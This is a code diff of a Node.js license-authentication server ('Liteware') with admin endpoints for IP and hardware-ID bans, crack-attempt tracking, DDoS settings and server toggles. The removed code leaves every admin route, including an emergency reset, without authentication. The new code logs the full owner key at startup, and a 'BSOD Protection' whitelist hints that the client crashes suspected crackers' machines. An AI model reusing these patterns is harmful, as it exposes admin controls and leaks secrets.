-        active_sessions: activeSessions.size,
-        active_users: activeCount,
-        total_keys: Object.keys(licenses).length,
-        rate_limited: rateLimitStore.size,
-        crack_attempts: crackAttempts.length,
-        crack_attempts_24h: crackAttempts.filter(a => a.timestamp > Date.now() - 24*60*60*1000).length
-    });
-});
-
-app.post('/auth/admin/get-all-status', (req, res) => {
-    res.json({
-        success: true,
-        server_enabled: !serverDisabled,
-        server_disabled: serverDisabled,
-        auth_enabled: authEnabled,
-        maintenance: maintenanceMode,
-        lockdown: lockdownMode,
-        website_locked: websiteLocked
-    });
-});
-
-// ========================================
-// ADMIN: SERVER CONTROLS
-// ========================================
-app.post('/auth/admin/toggle-server', (req, res) => {
-    serverDisabled = !serverDisabled;
-    res.json({ success: true, server_enabled: !serverDisabled });
-});
-
-app.post('/auth/admin/enable-server', (req, res) => {
-    serverDisabled = false;
-    res.json({ success: true, message: 'Server enabled' });
-});
-
-app.post('/auth/admin/disable-server', (req, res) => {
-    serverDisabled = true;
-    res.json({ success: true, message: 'Server disabled' });
-});
-
-app.post('/auth/admin/set-maintenance', (req, res) => {
-    const { enabled } = req.body;
-    maintenanceMode = enabled !== undefined ? enabled : !maintenanceMode;
-    res.json({ success: true, maintenance_mode: maintenanceMode });
-});
-
-app.post('/auth/admin/set-lockdown', (req, res) => {
-    const { enabled } = req.body;
-    lockdownMode = enabled !== undefined ? enabled : !lockdownMode;
-    res.json({ success: true, lockdown_mode: lockdownMode });
-});
-
-app.post('/auth/admin/set-auth-status', (req, res) => {
-    const { enabled } = req.body;
-    authEnabled = enabled !== undefined ? enabled : !authEnabled;
-    res.json({ success: true, auth_enabled: authEnabled });
-});
-
-app.post('/auth/admin/set-server-status', (req, res) => {
-    const { enabled } = req.body;
-    serverDisabled = enabled !== undefined ? !enabled : serverDisabled;
-    res.json({ success: true, server_enabled: !serverDisabled });
-});
-
-app.post('/auth/admin/set-website-lock', (req, res) => {
-    const { locked } = req.body;
-    websiteLocked = locked !== undefined ? locked : !websiteLocked;
-    res.json({ success: true, website_locked: websiteLocked });
-});
-
-app.post('/auth/admin/lockdown', (req, res) => {
-    const { enabled } = req.body;
-    lockdownMode = enabled !== undefined ? enabled : !lockdownMode;
-    res.json({ success: true, lockdown_mode: lockdownMode });
-});
-
-// ========================================
-// ADMIN: IP MANAGEMENT
-// ========================================
-app.post('/auth/admin/whitelist-ip', (req, res) => {
-    const { ip } = req.body;
-    if (ip) { whitelistedIPs.add(ip); res.json({ success: true, message: `IP ${ip} whitelisted` }); }
-    else res.json({ success: false, message: 'IP required' });
-});
-
-app.post('/auth/admin/unwhitelist-ip', (req, res) => {
-    const { ip } = req.body;
-    if (ip) { whitelistedIPs.delete(ip); res.json({ success: true, message: `IP ${ip} removed` }); }
-    else res.json({ success: false, message: 'IP required' });
-});
-
-app.post('/auth/admin/list-whitelisted-ips', (req, res) => {
-    res.json({ success: true, whitelisted_ips: Array.from(whitelistedIPs) });
-});
-
-app.post('/auth/admin/get-my-ip', (req, res) => {
-    const ip = getIP(req);
-    res.json({ success: true, ip, is_whitelisted: isWhitelisted(ip) });
-});
-
-app.post('/auth/admin/whitelist-my-ip', (req, res) => {
-    const ip = getIP(req);
-    whitelistedIPs.add(ip);
-    res.json({ success: true, message: `Your IP ${ip} has been whitelisted`, ip });
-});
-
-app.post('/auth/admin/ban-ip', (req, res) => {
-    const { ip } = req.body;
-    if (ip) { bannedIPs.add(ip); res.json({ success: true, message: `IP ${ip} banned` }); }
-    else res.json({ success: false, message: 'IP required' });
-});
-
-app.post('/auth/admin/unban-ip', (req, res) => {
-    const { ip } = req.body;
-    if (ip) { bannedIPs.delete(ip); res.json({ success: true, message: `IP ${ip} unbanned` }); }
-    else res.json({ success: false, message: 'IP required' });
-});
-
-app.post('/auth/admin/list-banned-ips', (req, res) => {
-    res.json({ success: true, banned_ips: Array.from(bannedIPs) });
-});
-
-// ========================================
-// ADMIN: HWID MANAGEMENT
-// ========================================
-app.post('/auth/admin/ban-hwid', (req, res) => {
-    const { hwid } = req.body;
-    if (hwid) { bannedHWIDs.add(hwid); res.json({ success: true, message: `HWID banned` }); }
-    else res.json({ success: false, message: 'HWID required' });
-});
-
-app.post('/auth/admin/unban-hwid', (req, res) => {
-    const { hwid } = req.body;
-    if (hwid) { bannedHWIDs.delete(hwid); res.json({ success: true, message: `HWID unbanned` }); }
-    else res.json({ success: false, message: 'HWID required' });
-});
-
-app.post('/auth/admin/list-bans', (req, res) => {
-    res.json({
-        success: true,
-        banned_ips: Array.from(bannedIPs),
-        banned_hwids: Array.from(bannedHWIDs)
-    });
-});
-
-app.post('/auth/admin/clear-all-bans', (req, res) => {
-    bannedIPs.clear();
-    bannedHWIDs.clear();
-    res.json({ success: true, message: 'All bans cleared' });
-});
-
-// ========================================
-// KEY WHITELIST MANAGEMENT (BSOD Protection)
-// ========================================
-app.post('/auth/admin/whitelist-key', (req, res) => {
+// Reset HWID
+app.post('/auth/admin/reset-hwid', requireOwnerKey, (req, res) => {
     const { license_key } = req.body;
-    if (license_key) {
-    whitelistedKeys.add(license_key);
-        res.json({ success: true, message: `Key ${license_key} whitelisted (BSOD protected)` });
-    } else {
-        res.json({ success: false, message: 'License key required' });
-    }
-});
-
-app.post('/auth/admin/unwhitelist-key', (req, res) => {
-    const { license_key } = req.body;
-    if (license_key) {
-        whitelistedKeys.delete(license_key);
-        res.json({ success: true, message: `Key ${license_key} removed from whitelist` });
-    } else {
-        res.json({ success: false, message: 'License key required' });
-    }
-});
-
-app.post('/auth/admin/list-whitelisted-keys', (req, res) => {
-    res.json({ 
-        success: true, 
-        whitelisted_keys: Array.from(whitelistedKeys),
-        count: whitelistedKeys.size
-    });
-});
-
-// Check if a key is whitelisted (called from C++ client)
-app.post('/auth/check-key-whitelist', (req, res) => {
-    const { license_key } = req.body;
-    if (!license_key) {
-        return res.json({ success: false, whitelisted: false, message: 'License key required' });
-    }
-    const isWhitelisted = whitelistedKeys.has(license_key);
-    res.json({ success: true, whitelisted: isWhitelisted });
-});
-
-// ========================================
-// CRACK ATTEMPT COUNTER MANAGEMENT
-// ========================================
-app.post('/auth/admin/get-crack-counters', (req, res) => {
-    const counters = [];
-    const now = Date.now();
+    const license = dataStores.licenses.get(license_key);
     
-    crackAttemptCounter.forEach((data, hwid) => {
-        // Check if 24 hours have passed
-        const hoursElapsed = (now - data.firstAttempt) / (1000 * 60 * 60);
-        counters.push({
-            hwid,
-            count: data.count,
-            firstAttempt: data.firstAttempt,
-            hoursElapsed: Math.floor(hoursElapsed),
-            willReset: hoursElapsed >= 24
-        });
-    });
-    
-    res.json({ success: true, counters });
+    if (license) {
+        license.hwid = null;
+        license.activated = false;
+        res.json({ success: true, message: 'HWID reset' });
+    } else {
+        res.json({ success: false, message: 'Key not found' });
+    }
 });
 
-app.post('/auth/admin/reset-crack-counter', (req, res) => {
+// Ban IP
+app.post('/auth/admin/ban-ip', requireOwnerKey, (req, res) => {
+    const { ip } = req.body;
+    if (ip) {
+        dataStores.bannedIPs.add(ip);
+        res.json({ success: true, message: `IP ${ip} banned` });
+    } else {
+        res.json({ success: false, message: 'IP required' });
+    }
+});
+
+// Unban IP
+app.post('/auth/admin/unban-ip', requireOwnerKey, (req, res) => {
+    const { ip } = req.body;
+    dataStores.bannedIPs.delete(ip);
+    dataStores.tempBannedIPs.delete(ip);
+    dataStores.suspiciousIPs.delete(ip);
+    res.json({ success: true, message: `IP ${ip} unbanned` });
+});
+
+// Ban HWID
+app.post('/auth/admin/ban-hwid', requireOwnerKey, (req, res) => {
     const { hwid } = req.body;
     if (hwid) {
-        crackAttemptCounter.delete(hwid);
-        res.json({ success: true, message: `Counter reset for ${hwid}` });
+        dataStores.bannedHWIDs.add(hwid);
+        res.json({ success: true, message: 'HWID banned' });
     } else {
         res.json({ success: false, message: 'HWID required' });
     }
 });
 
-app.post('/auth/admin/reset-all-crack-counters', (req, res) => {
-    crackAttemptCounter.clear();
-    res.json({ success: true, message: 'All crack counters reset' });
+// Unban HWID
+app.post('/auth/admin/unban-hwid', requireOwnerKey, (req, res) => {
+    const { hwid } = req.body;
+    dataStores.bannedHWIDs.delete(hwid);
+    res.json({ success: true, message: 'HWID unbanned' });
 });
 
-// ========================================
-// EMERGENCY RESET
-// ========================================
-app.post('/auth/emergency-reset', (req, res) => {
-    bannedIPs.clear();
-    bannedHWIDs.clear();
-    rateLimitStore.clear();
-    crackAttemptCounter.clear();
-    ddosProtection.tempBans.clear();
-    ddosProtection.suspiciousIPs.clear();
-    ddosProtection.slidingWindow.clear();
-    ddosProtection.burstTracking.clear();
-    serverDisabled = false;
-    maintenanceMode = false;
-    lockdownMode = false;
-    websiteLocked = false;
-    authEnabled = true;
-    res.json({ success: true, message: 'Emergency reset complete' });
-});
-
-// ========================================
-// DDOS PROTECTION ADMIN ENDPOINTS
-// ========================================
-app.post('/auth/admin/ddos-stats', (req, res) => {
+// List bans
+app.post('/auth/admin/list-bans', requireOwnerKey, (req, res) => {
     res.json({
         success: true,
-        stats: ddos.getStats(),
-        settings: ddosProtection.settings,
-        temp_bans: Array.from(ddosProtection.tempBans.entries()).map(([ip, data]) => ({
-            ip: ip,
-            reason: data.reason,
-            expires_in: Math.ceil((data.expires - Date.now()) / 1000)
-        })),
-        suspicious_ips: Array.from(ddosProtection.suspiciousIPs)
+        banned_ips: Array.from(dataStores.bannedIPs),
+        banned_hwids: Array.from(dataStores.bannedHWIDs),
+        temp_banned_ips: Array.from(dataStores.tempBannedIPs.keys())
     });
 });
 
-app.post('/auth/admin/ddos-unban', (req, res) => {
-    const { ip } = req.body;
-    if (!ip) return res.json({ success: false, message: 'IP required' });
-    
-    ddosProtection.tempBans.delete(ip);
-    ddosProtection.suspiciousIPs.delete(ip);
-    ddosProtection.requestCounts.delete(`suspicious:${ip}`);
-    
-    res.json({ success: true, message: `DDoS ban removed for ${ip}` });
+// Clear all bans
+app.post('/auth/admin/clear-all-bans', requireOwnerKey, (req, res) => {
+    dataStores.bannedIPs.clear();
+    dataStores.bannedHWIDs.clear();
+    dataStores.tempBannedIPs.clear();
+    dataStores.suspiciousIPs.clear();
+    res.json({ success: true, message: 'All bans cleared' });
 });
 
-app.post('/auth/admin/ddos-clear-all', (req, res) => {
-    ddosProtection.tempBans.clear();
-    ddosProtection.suspiciousIPs.clear();
-    ddosProtection.slidingWindow.clear();
-    ddosProtection.burstTracking.clear();
-    ddosProtection.stats.activeBans = 0;
-    
-    res.json({ success: true, message: 'All DDoS bans cleared' });
+// Server controls
+app.post('/auth/admin/enable-server', requireOwnerKey, (req, res) => {
+    dataStores.serverState.enabled = true;
+    res.json({ success: true, message: 'Server enabled' });
 });
 
-app.post('/auth/admin/ddos-settings', (req, res) => {
-    const { maxRequestsPerSecond, maxRequestsPerMinute, burstThreshold, tempBanDuration, challengeEnabled } = req.body;
-    
-    if (maxRequestsPerSecond !== undefined) ddosProtection.settings.maxRequestsPerSecond = maxRequestsPerSecond;
-    if (maxRequestsPerMinute !== undefined) ddosProtection.settings.maxRequestsPerMinute = maxRequestsPerMinute;
-    if (burstThreshold !== undefined) ddosProtection.settings.burstThreshold = burstThreshold;
-    if (tempBanDuration !== undefined) ddosProtection.settings.tempBanDuration = tempBanDuration;
-    if (challengeEnabled !== undefined) ddosProtection.settings.challengeEnabled = challengeEnabled;
-    
-    res.json({ success: true, message: 'DDoS settings updated', settings: ddosProtection.settings });
+app.post('/auth/admin/disable-server', requireOwnerKey, (req, res) => {
+    dataStores.serverState.enabled = false;
+    res.json({ success: true, message: 'Server disabled' });
 });
 
-// ========================================
-// VERIFY HWID
-// ========================================
-app.post('/auth/verify-hwid', (req, res) => {
-    const { hwid, gpu_hash, motherboard_uuid, _challenge } = req.body;
-    const hw = hwid || gpu_hash;
+app.post('/auth/admin/lockdown', requireOwnerKey, (req, res) => {
+    const { enabled } = req.body;
+    dataStores.serverState.lockdown = enabled !== false;
+    res.json({ success: true, lockdown: dataStores.serverState.lockdown });
+});
+
+app.post('/auth/admin/set-maintenance', requireOwnerKey, (req, res) => {
+    const { enabled } = req.body;
+    dataStores.serverState.maintenance = enabled !== false;
+    res.json({ success: true, maintenance: dataStores.serverState.maintenance });
+});
+
+app.post('/auth/admin/set-website-lock', requireOwnerKey, (req, res) => {
+    const { locked } = req.body;
+    dataStores.serverState.websiteLocked = locked !== false;
+    res.json({ success: true, website_locked: dataStores.serverState.websiteLocked });
+});
+
+app.post('/auth/admin/set-auth-status', requireOwnerKey, (req, res) => {
+    const { enabled } = req.body;
+    dataStores.serverState.authEnabled = enabled !== false;
+    res.json({ success: true, auth_enabled: dataStores.serverState.authEnabled });
+});
+
+// Rotate owner key
+app.post('/auth/admin/rotate-owner-key', requireOwnerKey, (req, res) => {
+    const newKey = CryptoUtils.generateToken(32);
+    dataStores.ownerKey = {
+        key: newKey,
+        created: Date.now(),
+        lastUsed: null,
+        rotateAt: Date.now() + 24*60*60*1000
+    };
+    res.json({ success: true, owner_key: newKey, message: 'Owner key rotated' });
+});
+
+// Stats
+app.post('/auth/admin/stats', requireOwnerKey, (req, res) => {
+    res.json({
+        success: true,
+        total_licenses: dataStores.licenses.size,
+        active_sessions: dataStores.activeSessions.size,
+        banned_ips: dataStores.bannedIPs.size,
+        banned_hwids: dataStores.bannedHWIDs.size,
+        stats: dataStores.stats,
+        uptime: Math.floor((Date.now() - dataStores.serverState.startTime) / 1000)
+    });
+});
+
+// Crack attempts
+app.post('/auth/admin/get-crack-attempts', requireOwnerKey, (req, res) => {
+    const { limit = 50 } = req.body;
+    const attempts = dataStores.crackAttempts.slice(-limit).reverse();
+    res.json({
+        success: true,
+        attempts,
+        total: dataStores.crackAttempts.length
+    });
+});
+
+// Kill all sessions
+app.post('/auth/admin/revoke-all-sessions', requireOwnerKey, (req, res) => {
+    const count = dataStores.activeSessions.size;
+    dataStores.activeSessions.clear();
+    res.json({ success: true, message: `Revoked ${count} sessions` });
+});
+
+// ============================================================================
+// CLEANUP TASKS
+// ============================================================================
+setInterval(() => {
+    const now = Date.now();
     
-    if (bannedHWIDs.has(hw)) {
-        return res.json(sign({ success: false, message: 'HWID banned' }, _challenge));
+    // Clean old nonces
+    for (const [nonce, timestamp] of dataStores.usedNonces) {
+        if (now - timestamp > SECURITY_CONFIG.nonceExpiry) {
+            dataStores.usedNonces.delete(nonce);
+        }
     }
-    res.json(sign({ success: true, message: 'HWID valid' }, _challenge));
-});
+    
+    // Clean old sliding window entries
+    const currentSecond = Math.floor(now / 1000);
+    for (const [key] of dataStores.slidingWindow) {
+        const parts = key.split(':');
+        const time = parseInt(parts[parts.length - 1]);
+        if (parts[1] === 'min') {
+            if (Math.floor(now / 60000) - time > 5) {
+                dataStores.slidingWindow.delete(key);
+            }
+        } else {
+            if (currentSecond - time > 10) {
+                dataStores.slidingWindow.delete(key);
+            }
+        }
+    }
+    
+    // Clean expired sessions
+    for (const [token, session] of dataStores.activeSessions) {
+        const age = now - session.created;
+        const heartbeatAge = now - session.lastHeartbeat;
+        
+        if (age > SECURITY_CONFIG.sessionTimeout ||
+            heartbeatAge > SECURITY_CONFIG.heartbeatInterval * SECURITY_CONFIG.maxMissedHeartbeats) {
+            dataStores.activeSessions.delete(token);
+        }
+    }
+    
+    // Clean expired temp bans
+    for (const [ip, ban] of dataStores.tempBannedIPs) {
+        if (now > ban.expires) {
+            dataStores.tempBannedIPs.delete(ip);
+        }
+    }
+    
+    // Trim crack attempts log
+    if (dataStores.crackAttempts.length > 1000) {
+        dataStores.crackAttempts = dataStores.crackAttempts.slice(-500);
+    }
+}, 60000);
 
-// ========================================
+// ============================================================================
 // START SERVER
-// ========================================
+// ============================================================================
 const PORT = process.env.PORT || 3000;
-
-    app.listen(PORT, () => {
-    console.log(`✅ Liteware Auth Server running on port ${PORT}`);
-    console.log(`📋 Total licenses: ${Object.keys(licenses).length}`);
-    console.log(`🔑 Owner key: ${ownerKey.key.substring(0, 16)}...`);
+app.listen(PORT, () => {
+    console.log('============================================');
+    console.log('⚡ LITEWARE AUTH SERVER v5.0 - 10/10 SECURITY');
+    console.log('============================================');
+    console.log(`🚀 Running on port ${PORT}`);
+    console.log(`🔐 Owner Key: ${dataStores.ownerKey.key}`);
+    console.log('============================================');
+    console.log('Security Features:');
+    console.log('  ✅ Request signing & verification');
+    console.log('  ✅ Replay attack prevention');
+    console.log('  ✅ DDoS protection');
+    console.log('  ✅ Behavioral analysis');
+    console.log('  ✅ Honeypot endpoints');
+    console.log('  ✅ Response encryption');
+    console.log('  ✅ Session management');
+    console.log('  ✅ IP/HWID banning');
+    console.log('============================================');
 });
 
-process.on('uncaughtException', (err) => console.error('Error:', err.message));
-process.on('unhandledRejection', (reason) => console.error('Rejection:', reason));
+module.exports = app;
+
